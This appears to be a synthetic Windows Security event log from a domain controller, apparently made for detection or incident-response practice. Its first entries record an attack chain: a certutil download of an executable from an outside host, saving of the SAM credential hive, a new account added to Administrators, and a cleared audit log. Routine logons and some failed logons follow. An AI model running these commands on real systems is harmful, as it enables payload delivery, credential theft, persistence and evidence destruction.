Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:27:41 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x4BD7
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	whoami.exe /all

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:28:08 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x40E
	New Process Name:	C:\Windows\System32\net.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	net.exe group "Domain Admins" /domain

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:29:22 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x2610
	New Process Name:	C:\Windows\System32\certutil.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	certutil.exe -urlcache -split -f http://203.0.113.77:8080/t.exe C:\Users\Public\t.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:30:05 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x25EC
	New Process Name:	C:\Windows\System32\reg.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	reg.exe save HKLM\SAM C:\Users\Public\sam.hiv

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:31:17 AM
Event ID:      4720
Task Category: User Account Management
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A user account was created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Account Name:	svc_helpdesk
	New Account Domain:	CORP
	SAM Account Name:	svc_helpdesk

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:31:52 AM
Event ID:      4732
Task Category: Security Group Management
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A member was added to a security-enabled local group.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Group Name:	Administrators
	Group Domain:	Builtin
	Member Name:	CORP\svc_helpdesk

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:33:40 AM
Event ID:      1102
Task Category: Log clear
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
The audit log was cleared.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Domain Name:	CORP
	Logon ID:	0x3E7

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:37:51 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x5259
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:38:35 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xA28718
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	55874
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:47:07 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x50AC
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:51:12 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xFA892D
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	48199
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:56:04 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xA36AEC
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	47217
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:05:13 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x982E52
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	33884
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:14:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x320FFD
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	50954
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:21:17 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	37256
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:26:11 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x312E
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:30:47 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0xF593
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:41:15 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x10BA53
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	46560
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:42:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0xFF195E
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	34572
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:42:45 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x6AE3
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:46:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xE75452
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	35574
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:46:36 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x556648
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	44161
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:47:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x54117A
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	39069
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:54:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x5B0C38
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	47529
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:57:48 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	44076
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 11:59:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xD1CC23
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	49470
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:00:27 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	32241
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:08:20 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x675183
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	43217
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:09:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0x57ADF7
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	32811
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:13:01 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	42466
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:14:22 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	37004
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

